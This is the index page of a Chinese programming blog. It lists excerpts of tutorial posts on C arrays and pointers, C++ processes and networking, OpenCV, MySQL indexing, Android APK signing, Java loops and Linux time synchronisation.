<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe71bd723155490ab9ba95095539b391/" rel="bookmark">
			C语言 函数中返回数组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 函数无法直接返回数组，要使用static定义数组，再返回。这样相当于定义全局变量。
static double v[10]={0}; ...... return v; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e393fb48ed34669189eee8fc30e7b355/" rel="bookmark">
			C&#43;&#43; 多进程开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、程序二、进程三、 操作系统单道和多道程序时间片并行和并发进程控制块（PCB） 四、进程状态 和 Linux下的命令进程的状态Linux进程命令查看进程杀死进程进程号和相关函数 五、子进程的创建和执行进程的创建 fork()多进程调试 GDBexec函数族 六、 进程控制进程的退出孤儿进程僵尸进程进程回收wait()waitpid() 进程通信匿名管道管道的读写特点创建匿名管道设置管道非阻塞 有名管道有名管道的使用 内存映射信号发送信号相关的函数：定时器函数信号捕捉函数信号集sigaction信号捕捉函数 共享内存消息队列守护进程进程组和会话进程组、会话操作函数守护进程 总结 一、程序 程序是包含一系列信息的文件，这些信息描述了如何在运行时创建一个进程：
二进制格式标识：每个程序文件都包含用于描述可执行文件格式的元信息（是指描述文件本身的信息，例如文件大小，和文件内存储的数据）。内核利用此信息来解释文件中的其他信息。（ELF可执行连接格式）。机器语言指令：对程序算法进行编码。程序入口地址：标识程序开始执行时的起始指令位置。数据：程序文件包含的变量初始值和程序使用的字面量值（比如字符串）。符号表及重定位表：描述程序中函数和变量的位置及名称。这些表格有多重用途，其中包括调试和运行时的符号解析（动态链接）。共享库和动态链接信息：程序文件所包含的一些字段，列出了程序运行时需要使用的共享库，以及加载共享库的动态连接器的路径名。其他信息：程序文件还包含许多其他信息，用以描述如何创建进程。 二、进程 进程是正在运行的程序的实例。是一个具有一定独立功能的程序关于某个数据集合的一次运行活动。它是资源分配的基本单位。可以用一个程序来创建多个进程，进程是由内核定义的抽象实体，并为该实体分配用以执行程序的各项系统资源。从内核的角度看，进程由用户内存空间和一系列内核数据结构组成，其中用户内存空间包含了程序代码及代码所使用的变量，而内核数据结构则用于维护进程状态信息。记录在内核数据结构中的信息包括许多与进程相关的标识号（IDs）、虚拟内存表、打开文件的描述符表、信号传递及处理的有关信息、进程资源使用及限制、当前工作目录和大量的其他信息。 三、 操作系统 操作系统调度进程有两种方式：抢占式调度和非抢占时调度，其中非抢占式调度只有进程阻塞时，CPU才会处理其他资源。抢占式调度系统会根据某种原则终止当前运行的进程去执行另一个以及就绪的进程。抢占式调度的源泽包括：时间片原则、优先级原则、短作业优先原则。
单道和多道程序 单道程序，即在计算机内存中只允许一个的程序运行。多道程序设计技术是在计算机内存中同时存放几道相互独立的程序，使它们在管理程序控制下，相互穿插运行，两个或两个以上程序在计算机系统中同处于开始到结束之间的状态, 这些程序共享计算机系统资源。引入多道程序设计技术的根本目的是为了提高 CPU 的利用率。对于一个单 CPU 系统来说，程序同时处于运行状态只是一种宏观上的概念，他们虽然都已经开始运行，但就微观而言，任意时刻，CPU 上运行的程序只有一个。在多道程序设计模型中，多个进程轮流使用 CPU。而当下常见 CPU 为纳秒级，1秒可以执行大约 10 亿条指令。由于人眼的反应速度是毫秒级，所以看似同时在运行。 时间片 时间片（timeslice）又称为“量子（quantum）”或“处理器片（processor slice）”是操作系统分配给每个正在运行的进程微观上的一段 CPU 时间。事实上，虽然一台计算机通常可能有多个 CPU，但是同一个 CPU 永远不可能真正地同时运行多个任务。在只考虑一个 CPU 的情况下，这些进程“看起来像”同时运行的，实则是轮番穿插地运行，由于时间片通常很短（在 Linux 上为 5ms－800ms），用户不会感觉到。时间片（timeslice）又称为“量子（quantum）”或“处理器片（processor slice）”是操作系统分配给每个正在运行的进程微观上的一段 CPU 时间。事实上，虽然一台计算机通常可能有多个 CPU，但是同一个 CPU 永远不可能真正地同时运行多个任务。在只考虑一个 CPU 的情况下，这些进程“看起来像”同时运行的，实则是轮番穿插地运行，由于时间片通常很短（在 Linux 上为 5ms－800ms），用户不会感觉到。 并行和并发 并行(parallel)：指在同一时刻，有多条指令在多个处理器上同时执行。并发(concurrency)：指在同一时刻只能有一条指令执行，但多个进程指令被快速的轮换执行，使得在宏观上具有多个进程同时执行的效果，但在微观上并不是同时执行的，只是把时间分成若干段，使多个进程快速交替的执行。并发是我们需要研究的。
进程控制块（PCB） 为了管理进程，内核必须对每个进程所做的事情进行清楚的描述。内核为每个进程分配一个 PCB(Processing Control Block)进程控制块，维护进程相关的信息，Linux 内核的进程控制块是 task_struct 结构体。在 /usr/src/linux-headers-xxx/include/linux/sched.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e393fb48ed34669189eee8fc30e7b355/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb2b008694a779c0faa5368bd96f7603/" rel="bookmark">
			C语言-指针练习（附答案）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.输入10个整数，将其中最小的数与第一个数对换，把最大的数与最后一个数对换。最后输出这10个整数。
2.两个变量交换
4.有一个班，3个学生，各学4门课，计算总平均分以及输出第n个学生的成绩。
5.判断输入的字符串是否为回文
6.解密藏头诗，如“一叶轻舟向东流，帆梢轻握杨柳手，风纤碧波微起舞，顺水任从雅客悠”
1.输入10个整数，将其中最小的数与第一个数对换，把最大的数与最后一个数对换。最后输出这10个整数。 #include&lt;stdio.h&gt; int main() { int a[10]; int *p; p=a; int *min,*max; int i,t; max=a;min=a; for(i=1;i&lt;10;i++) scanf("%d",p++); { if(*max&lt;*p) max=p; if(*min&gt;*p) min=p;} t=*max;*max=a[9];a[9]=t; t=*min;*min=a[0];a[0]=t; for(p=a;p&lt;a+10;p++) printf("%d",*p); } 2.两个变量交换 #include&lt;stdio.h&gt; void swap(int *pa,int *pb); int main() { int a; int b; scanf("%d%d",&amp;a,&amp;b); swap(&amp;a,&amp;b); printf("a=%d,b=%d",a,b); return 0; } void swap(int *pa,int *pb) { int t=*pa;*pa=*pb;*pb=t; } 3.用指针变量输出a[3][4]中的每一个元素
#include&lt;stdio.h&gt; int main() { int *p; int a[3][4]={1,2,3,4,5,6,7,8,9,10,11,12}; int i,j; for(p=a[0];p&lt;a[0]+12;p++) { if((p-a[0])%4==0) printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb2b008694a779c0faa5368bd96f7603/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ae559883cf317e964a50000b130276c/" rel="bookmark">
			C&#43;&#43; 网络编程（第二篇）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、OSI七层网络模型二、TCP/IP 四层模型三、协议四、常见协议UDP协议TCP协议IP协议以太网帧协议ARP协议封装分用 五、UDP通信流程六、TCP的通信流程七、TCP三次握手八、滑动窗口TCP 流量控制TCP 拥塞控制慢开始与拥塞避免快重传与快恢复 九、四次挥手十、TCP如何提供可靠数据传输的十一、TCP的粘包和拆包十二、TCP的状态转换十三、半关闭十四、端口复用总结 前言 这里讲一下网络模型：OSI七层网络模型、TCP/IP四层模型、常见的协议。
一、OSI七层网络模型 OSI七层模型，亦称 OSI（Open System Interconnection）参考模型，即开放式系统互联。参考模型是国际标准化组织（ISO）制定的一个用于计算机或通信系统间互联的标准体系，一般称为 OSI 参考模型或七层模型。它是一个七层的、抽象的模型体，不仅包括一系列抽象的术语或概念，也包括具体的协议。
物理层：主要定义物理设备标准，如网线的接口类型、光纤的接口类型、各种传输介质的传输速率等。它的主要作用是传输比特流（就是由1、0转化为电流强弱来进行传输，到达目的地后再转化为1、0，也就是我们常说的数模转换与模数转换）。这一层的数据叫做比特。数据链路层：建立逻辑连接、进行硬件地址寻址、差错校验等功能。定义了如何让格式化数据以帧为单位进行传输，以及如何控制对物理介质的访问。将比特组合成字节进而组合成帧，用MAC地址访问介质。网络层：进行逻辑地址寻址，在位于不同地理位置的网络中的两个主机系统之间提供连接和路径选择。Internet的发展使得从世界各站点访问信息的用户数大大增加，而网络层正是管理这种连接的层。传输层：定义了一些传输数据的协议和端口号（ WWW 端口 80 等），如：TCP（传输控制协议，传输效率低，可靠性强，用于传输可靠性要求高，数据量大的数据），UDP（用户数据报协议，与TCP 特性恰恰相反，用于传输可靠性要求不高，数据量小的数据，如 QQ 聊天数据就是通过这种方式传输的）。 主要是将从下层接收的数据进行分段和传输，到达目的地址后再进行重组。常常把这一层数据叫做段。会话层：通过传输层（端口号：传输端口与接收端口）建立数据传输的通路。主要在你的系统之间发起会话或者接受会话请求。表示层：数据的表示、安全、压缩。主要是进行对接收的数据进行解释、加密与解密、压缩与解压缩等（也就是把计算机能够识别的东西转换成人能够能识别的东西（如图片、声音等）。应用层：网络服务与最终用户的一个接口。这一层为用户的应用程序（例如电子邮件、文件传输和终端仿真）提供网络服务。 记忆顺口溜：物、数、网、传、会、表、应。
二、TCP/IP 四层模型 现在 Internet（因特网）使用的主流协议族是 TCP/IP 协议族，它是一个分层、多协议的通信体系。TCP/IP协议族是一个四层协议系统，自底而上分别是数据链路层、网络层、传输层和应用层。每一层完成不同的功能，且通过若干协议来实现，上层协议使用下层协议提供的服务。
TCP/IP 协议在一定程度上参考了 OSI 的体系结构。OSI 模型共有七层，从下到上分别是物理层、数据链路层、网络层、传输层、会话层、表示层和应用层。但是这显然是有些复杂的，所以在 TCP/IP 协议中，它们被简化为了四个层次。
（1）应用层、表示层、会话层三个层次提供的服务相差不是很大，所以在 TCP/IP 协议中，它们被合并为应用层一个层次。
（2）由于传输层和网络层在网络协议中的地位十分重要，所以在 TCP/IP 协议中它们被作为独立的两个层次。
（3）因为数据链路层和物理层的内容相差不多，所以在 TCP/IP 协议中它们被归并在网络接口层一个层次里。只有四层体系结构的 TCP/IP 协议，与有七层体系结构的 OSI 相比要简单了不少，也正是这样，TCP/IP 协议在实际的应用中效率更高，成本更低。
四层介绍
应用层：应用层是 TCP/IP 协议的第一层，是直接为应用进程提供服务的。
（1）对不同种类的应用程序它们会根据自己的需要来使用应用层的不同协议，邮件传输应用使用了 SMTP 协议、万维网应用使用了 HTTP 协议、远程登录服务应用使用了有TELNET 协议。
（2）应用层还能加密、解密、格式化数据。
（3）应用层可以建立或解除与其他节点的联系，这样可以充分节省网络资源。传输层：作为 TCP/IP 协议的第二层，运输层在整个 TCP/IP 协议中起到了中流砥柱的作用。且在运输层中， TCP 和 UDP 也同样起到了中流砥柱的作用。网络层：网络层在 TCP/IP 协议中的位于第三层。在 TCP/IP 协议中网络层可以进行网络连接的建立和终止以及 IP 地址的寻找等功能。网络接口层：在 TCP/IP 协议中，网络接口层位于第四层。由于网络接口层兼并了物理层和数据链路层所以，网络接口层既是传输数据的物理媒介，也可以为网络层提供一条准确无误的线路。（网线、网卡、MAC地址） 三、协议 协议，网络协议的简称，网络协议是通信计算机双方必须共同遵从的一组约定。如怎么样建立连接、怎么样互相识别等。只有遵守这个约定，计算机之间才能相互通信交流。它的三要素是：语法、语义、时序。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ae559883cf317e964a50000b130276c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb3ecc018454f92ea42d927bd085565f/" rel="bookmark">
			OpenCV 图片旋转
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		OpenCV 图片旋转的两个函数 cv2.getRotationMatrix2D 获得仿射变化矩阵cv2.warpAffine 进行仿射变化 getRotationMatrix2D 获得仿射变化矩阵（warpAffine 方法的重要参数） rot_mat = cv2.getRotationMatrix2D(center, -5, 1) 参数说明：
center 表示中间点的位置，-5 表示逆时针旋转5度，1 表示进行等比列的缩放
返回值：
rot_mat 仿射变化矩阵
例如：
warpAffine 进行仿射变化 img_rotated_by_alpha = cv2.warpAffine(img, rot_mat, (img.shape[1], img.shape[0])) 参数说明：
img 表示输入的图片，rot_mat 表示仿射变化矩阵，(image.shape[1], image.shape[0]) 表示变换后的图片大小，image.shape[1]表示宽，image.shape[0]表示高 返回值：
旋转后的图像
代码说明： 第一步：读入图片，进行图片展示
第二步：获取图片的宽、长、通道数，构造[0, 0, w, h]列表，然后用该列表实列化一个bbox对象（用于计算中心点）
第三步：计算其center值，将其代入到cv2.getRotationMatrix2D生成仿射变化矩阵
第四步：使用cv2.warpAffine(img, rot_mat, (img.shape[1], img.shape[0])) 获得仿射变化以后的图像
第五步：如果计算源图像上的某点，位于转换后图像的位置。如果是源图片上的一个点，那么经过变化以后的坐标值为
(rot_mat[0][0] * x + rot_mat[0][1] * y + rot_mat[0][2], rot_mat[1][0] * x + rot_mat[1][1] * y + rot_mat[1][2]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb3ecc018454f92ea42d927bd085565f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49fa9dd0fbedb0b7638dc424cb3648b3/" rel="bookmark">
			MySQL索引优化：索引失效以及不适合建立索引的场景
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言： 索引是有双面性的，合理的建立索引可以提高数据库的效率。但是如果没有合理的构建索引和使用索引，可能会导致索引失效或者影响数据库性能，本文主要讨论的是索引失效以及不适合建立索引的场景
结论：具体案例下文有详尽描述 不适合建立索引的场景：
数据量比较小的表不建议建立索引有大量重复数据的字段上不建议建立索引（类似：性别字段）需要进行频繁更新的表不建议建立索引where、group by、order by后面的没有使用到的字段不建立索引不要定义冗余索引 索引失效的场景：
过滤条件使用不等于(!=、&lt;&gt;)过滤条件使用is not null在索引字段上使用函数或进行计算在使用联合索引的时候，需要满足“最佳左前缀法则”，否则失效当使用了类型转换也会导致索引失效在使用范围查询的时候，联合索引的部分字段失效(where age &gt;18)在like字段中，如果是以%开头，索引失效(where name like ‘%abc’)在使用or进行查询的时候，or前后出现非索引字段，索引失效表和库的字符集不一致，回导致索引失效 知识点：
每张表的索引不建议超过6个（占用空间、降低表更新速度）最终到底是否使用索引还是优化器进行决定的优化器会根据数据量、数据库版本、数据选择读进行查询代价的比较，从而决定是否使用索引建立索引的时候将需要范围匹配的字段建立在索引的尾部，避免失效在建立表的时候将字段设置为not null同时设置默认值，当需要查找没有值的记录的时候就可以使用where xxx = 默认值，放置使用is not null导致索引失效页面搜索的时候严谨左模糊或者全模糊(like ‘%abc’)对于过滤性较好的字段建立在联合索引的前面，这样就可以优先过滤比较多的数据 不建议建立索引的场景： 场景一：数据少的表 当数据比较少的时候，索引的优势就不明显了，因为数据库的存储引擎也是非常快的，相较于需要查询索引在进行回表操作，可能直接查询的性能会更高一些，所以数据相对较少的表不建议建立索引
场景二：有大量重复数据的字段 类似于性别字段，只有“男”和“女”两个不同的值，所以索引一半的数据是“男”一半的数据是“女”，那么建立索引并不能进行快速的查询等，所以不建议在有大量重复数据的列上建立索引
场景三：频繁更新的表（update/delete/insert） 因为表中更新数据的时候，索引也是需要进行对应的维护的，如果一个表近期需要频繁的进行增删改操作，那么就需要耗费大量的时间去维护索引，不建议建立索引，可以在需要进行频繁的更新操作的时候将索引删除，更新完毕之后重建索引
场景四：没有使用的字段（where/group by/order by） 不是where/group by/order by后面的字段没有必要建立索引，因为不会使用到该索引
场景五：不要定义冗余索引 create index username_password_address on xiao(username,password,address); -- 如果建立了第一个索引，那么就没有必要建立第二个索引 create index username on xiao (username); --第二个索引就是冗余索引，因为第一个已经是先根据username排序的索引 --也就是第二个索引的功能完全可以由第一个索引实现 这里因为username作为第一个联合索引的第一个字段，所以索引就是按照username进行排序，在username相同的情况下按照password、address排序，所以也就是实现了单独拿username列作为索引的功能，即第二个索引就是多余的
索引失效的场景： 场景一：在建立索引的字段上进行运算(函数等)，导致索引失效 这里首先是给age创建了索引，在第一次查询过程中使用了age索引，但是第二次key值为null（索引失效），导致索引失效的原因在于第二次查询的时候where后面对age进行了计算，计算机并不知道执行的是什么计算所以会将age+1计算后与1比较，索引失效
类似于在字段上使用函数concat()等都会导致索引失效
场景二：使用不等于(where age != 18) 当使用等值运算，那么是可以在索引中进行查找的，但是如果是不等于，那么则需要遍历所有数据，所以所失效
explain select * from xiaoyuanhao where age = 18; explain select * from xiaoyuanhao where age !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/49fa9dd0fbedb0b7638dc424cb3648b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7776ad373c588dfaefed2fe5e0b304d/" rel="bookmark">
			MySQL索引优化：哪些情况下需要建立索引（适合构建索引的几种情况）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		适合构建索引的几种情况： 引言 我们知道正确的建立索引可以加快数据库的查询，但是如果索引建立不当，或者随意的建立过多索引不仅不会提升数据库的效率，反而在进行数据更新操作的时候需要耗费系统资源对索引进行维护，同时占用大量的存储空间来对索引进行存储，本文主要讲述在哪些情况下适合建立索引
结论： 在where后面的过滤字段上建立索引(select/update/delete后面的where都是适用的)，使用索引加快过滤效率，不用进行全表扫描在具有唯一要求的字段上添加唯一索引，加快查询效率，查到即可直接返回group by或者order by后面的字段添加索引，由于索引是排好序的，所以建立索引就等同于在查询之前已经是排好序了（这里需要注意建立的联合索引建立中字段的顺序，可以结合具体案例场景7进行学习）在DISTINCT（去重字段）后面的字段添加索引，由于建立了索引，那么相同的数据就是挨在一起的，所以就可以进行快速的去重操作，否则可能就需要将相同的数据找出来在进行去重操作在多表连接join的时候在连接的字段上建立索引（小表驱动大表）取字符串一定前缀建立索引（不是用整个字符串作为索引，否则将会占用太大的空间）在频繁使用的列上建立索引（可以建立联合索引，同时最频繁使用的字段应该在联合索引的最左侧，最左侧原则）在区分度高的列上建立索引（主键的区分度最高，因为所有的键都是唯一的） 建立索引的场景： 场景一：在where字段后面的字段建立索引 -- 描述：当where中有多个条件需要进行匹配的时候，那么可以创建联合索引，这样所有的条件都可以使用索引，大大提高了检索的效率 select * from student_info where student_id = 1; -- 当然数据量比较大的时候给where后面的字段添加索引 create index student_id_index on student_info (student_id) 未添加索引前，耗费0.383秒，基本遍历整个表
添加索引后，耗费0.001秒，使用了索引（但是创建索引的时候会耗费一定时间）
在频繁的查询的业务中可以对where筛选的字段建立索引，如果where筛选的字段有多个还可以建立联合索引
场景二：在具有唯一性约束的字段上建立唯一索引（查找到目标即可返回不用继续查找） select * from student_info where id = 1001; -- 因为学号是唯一的，所以可以在学号这个字段上添加唯一所用 create index id_unique on student_info(id); 具有唯一性约束的字段上就可以建立唯一索引，虽然建立了唯一索引对insert操作有一定的影响(需要判断新增的数据是否已经在表中)，但是建立唯一索引对于查询的效率是显著提升的，例如上面的例子，因为建立了唯一索引，一旦查找到id为1001的学生信息之后就不需要判断数据库中是否还有id等于1001的学生（只有唯一一份），直接返回信息即可，如果没有建立索引，那么就需要全表扫描
场景三：经常group by和order by的字段上建立索引（因为索引本身就是排好序的，相当于查询之前就已经进行了排序） select * from student_info order by name; -- 这里就可以给name字段进行索引的添加 select * from student_info group by class_id; -- 这里就可以给class_id字段添加索引 建立索引前，耗时0.501秒，使用的是所有数据在内存中排序
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7776ad373c588dfaefed2fe5e0b304d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c11738761a7cb632561225049ebb542/" rel="bookmark">
			什么是进程?
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		要想了解多线程编程,那就必须从本质上开始什么是进程?
首先,进程和可执行文件很像(文件名.exe)-&gt;这就是可执行文件.但是他们又有所不同.
但是可执行文件就像是静态的,躺在我们的硬盘中,但是,我们在任务管理器中可以明显的看到我们的进程是动态的,是在内存中不断被加载的.
我们可以理解为一个可执行文件是一个静态的,当我们双击运行的时候,操作系统就会把这个可执行文件中的关键信息加载到内存中,并且开始运行里面的代码,这样就形成了一个进程.
这就是可执行文件和进程的关系------&gt;进程是怎样形成的.
进程管理: 我们的一个操作系统中跑着这么多程序,但是我们的CPU的资源是有限的,我们要如何管理这些进程,保证进程能够正常运行,这就需要我们操作系统对进程的管理有一定的要求.
那么我们先说说管理:
管理的大致流程是这样的.
1.先描述:使用一个类/结构体将这东西有啥特征都给表示出来.
2.再组织:使用一个数据结构,将这些 对象/结构体 给整合到一起
我们的CPU也是这样进行管理的.
进程控制块(PCB:Processing Control Block),是操作系统核心中一种数据结构，主要表示进程状态，其作用是使一个程序成为一个能够独立运行的基本单位，并且可以并发执行的进程。或者说，OS是根据PCB来对并发执行的进程进行控制和管理。PCB通常是占用系统内存中一块连续的内存空间，存放着操作系统用于描述进程情况及控制进程运行的全部信息。
在进程创建状态的时候创建pcb、在进程终止的时候销毁pcb-----&gt;这一点很重要
其中PCB中包含了信息:
a.进程标识符. 内部标识符SID:操作系统为每个进程赋予的位移数字标识符,系统使用
外部标识符:由创建者提供,通常有字母与数字组成,往往是由(进程)在访问该进程时使用.描述进程的家族关系,设置父进程表示和子进程表示,还可以设置用户表示,以指示拥有该进程的用户.
b.上下文数据 主要是有处理机的各种寄存器中的内容组成的,处理机被中断的时候,所有这些信息都必须保存在pcb中,以便在该进程重新执行时能够冲断电继续执行.
c.进程的调度信息 进程的状态:创建,就绪,阻塞,执行,终止
进程的优先级:进程共有6个优先级
进程调度所需的其他信息,比如已等待CPU的时间综合,进程一直只想的时间总和.
事件,指进程由执行状态转为阻塞状态所等待发生的时间,即阻塞原因
d.进程控制信息 程序和数据的地址
进程同步的通信机制
支援清单链接指针
PCB的作用:
PCB可以被操作系统中的多个模块读写或者修改,如被调度程序,资源分配程序,中断处理程序以及监督分析程序等读或者修改.操作系统是根据pcb来对并发执行的进程进行控制和管理,所以说PCB是操作系统中最重要的记录型数据结构,作用如下:
1.作为独立运行的基本单位
2.能实现间断性运行方式
3.提供进程管理所需要的信息
4.提供进程调度所需要的信息
5.实现与其他进程同步与通信
操作系统内核中将若干个pcb串成一个双向链表
进程的调度
这个进程中的主要属性-----用来实现进程的调度.
当前计算机的CPU是有限的,但是进程的数量是比较多的,总的来说就是狼多肉少
所以我们要尽可能公平分配,就需要合理的分配调度,CPU就轮流使用.
CPU的论断速度实际上是非常快的 例如1.9GHz,一秒有19亿个时钟周期
因此,我们认识感知不到这样的轮转~站在宏观的角度来看,就好像这些进程在同时执行,但是微观上而是,"轮流使用"的方式占用CPU执行~
同时,我们还有两个概念就是"并发式执行" 和"并行式执行"
其实两者在宏观上两者就像是在CPU中的进程不断执行
但是在微观上"并发式执行"-&gt;"轮流" 的方式占用CPU
"并行式执行" -&gt;微观上有CPU上有多个核心,每个核心都可以跑一个进程,某一时刻就是在两个CPU上同时执行的.
进程的调度 进程的调度需要考虑很多因素
1.进程的优先级
对于进程有很多状态,但是最经典的就是:
就绪状态:进程是准备就绪的,随时可以上CPU执行
阻塞状态:进程在等待某个任务完成(读写磁盘),完成之后才能上CPU,完成之后才能上CPU,否则就没办法完成.
2.进程的上下文:
每次执行进程PCB都要记录好,执行进程的关键信息,当前处理进度,当前处理的进出/中间结果
对于进程来说,上下文具体的就是CPU里面一堆寄存器里面的值,上下文就会在进程被切出CPU的时候,把寄存器的状态保存到排查表中(内存)
3.进程的虚拟地址空间
进程需要使用一些系统资源,其中内存资源,就是一个很关键的资源.
为了让各个进程之间不要相互打扰,操作系统就引用了"虚拟地址空间"这样的概念
每个进程都只能访问到自己的地址空间,互相之间不会有影响,哪怕你指针出错,操作系统也能即使发现问题,不会影响其他的进程,就算出问题,问题也被限制在进城内部.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/83f8cb0312dc2f3610019acaa385b67d/" rel="bookmark">
			Android系统安全 — 5.3-APK V2签名介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. V2签名原理 1. JAR V1签名是在apk文件（其实是ZIP文件）中添加META-INF目录，即需要修改数据区、中央目录，因为添加文件后会导致中央目录大小和偏移量发生变化，还需要修改中央目录结尾记录。关于ZIP包结构的详细介绍见：压缩包Zip格式详析
2. V2方案为加强数据完整性保证，选择在数据区和中央目录之间插入一个APK签名分块，从而保证了原始zip（apk）数据的完整性。具体如下所示：
2. V2签名格式 2.1 签名块格式 APK签名分块的前8个字节记录了APK签名分块的大小 size of block（不含自身8字节），其后紧接着键值对数据块，数据块由一个个的键值对块组成。 每个键值对块的开始8字节记录了「键值对的ID」+「键值对的Value」的大小，接下来4字节是键值对的ID，后面紧跟着对应的值。 ID = 0x7109871a 的键值对块就是保存V2签名信息的地方。 键值对数据块的后面还有8个字节，也是用于记录「整个APK签名分块」的大小，它的值和最开始的8字节相同。 签名块的末尾是一个魔数magic，也就是APK Sig Block 42的 ASCII 码（小端排序）。
在解析 APK 时，首先要通过以下方法找到“ZIP 中央目录”的起始位置：在文件末尾找到“ZIP 中央目录结尾”记录，然后从该记录中读取“中央目录”的起始偏移量。通过 magic 值，可以快速确定“中央目录”前方可能是“APK 签名分块”。然后，通过 size of block 值，可以高效地找到该分块在文件中的起始位置，在解译该分块时，应忽略 ID 未知的“ID-值”对。
构造签名块的代码逻辑如下：
/** * 生成签名区块数据 * @param apkSignatureSchemeBlockPairs * @return */ public static byte[] generateApkSigningBlock( List&lt;Pair&lt;byte[], Integer&gt;&gt; apkSignatureSchemeBlockPairs) { // FORMAT: // uint64: size (excluding this field) // repeated ID-value pairs: // uint64: size (excluding this field) // uint32: ID // (size - 4) bytes: value // (extra verity ID-value for padding to make block size a multiple of 4096 bytes) // uint64: size (same as the one above) // uint128: magic int blocksSize = 0; for (Pair&lt;byte[], Integer&gt; schemeBlockPair : apkSignatureSchemeBlockPairs) { blocksSize += 8 + 4 + schemeBlockPair.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/83f8cb0312dc2f3610019acaa385b67d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e95c1361bd72ad60f427250c6e5ac53f/" rel="bookmark">
			使用Java的for循环编写九九乘法表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.
九九乘法表 1*1=1 1*2=2 2*2=4 1*3=3 2*3=6 3*3=9 1*4=4 2*4=8 3*4=12 4*4=16 .... ...... 1*9=9 2*9=18.............................9*9=81 2.详细代码如下：
public class For{ public static void main(String[] args){ //9行,循环9次 for(int i=1;i&lt;=9;i++){//纵向循环 //负责输出一行的。(内部for循环负责将一行上的全部输出。) for(int j=1;j&lt;=i;j++){ System.out.print(i + "*" + j + "=" + (i * j) + " " ); } //行与行之间的换行 System.out.println(); //System.out.print("\n"); } } } 3.最终效果图如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b13e45aea8456770a8ece03a59b86c0/" rel="bookmark">
			校准 Linux 服务器的时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近实验室的服务器时间出现偏差，导师让维护一下，特记录一下具体过程！！！
直接按照以下顺序执行命令即可：
1.安装ntp 安装ntp是为了第二步做准备
yum -y install ntp 2.校正服务器时间同网络时间一致 ntpdate 1.cn.pool.ntp.org 3.设置时区 tzselect 根据选择命令分别选择，5 Asia-&gt;9 China-&gt;1-&gt;Beijing Time -&gt;1 yes
4.拷贝入系统配置文件中 TZ='Asia/Shanghai'; export TZ 5.软件时间同步至硬件时间 hwclock -w 6.查看当前时间是否完成校准 date 显示当前正确的北京时间：
7.查看硬件时间是否完成校准 hwclock 也能显示正确的北京时间
至此，服务器的软件时间和硬件时间都已经校准完成！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db196e886235bcedd638599fdeb98302/" rel="bookmark">
			自然语言处理(NLP)之五：知识图谱
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
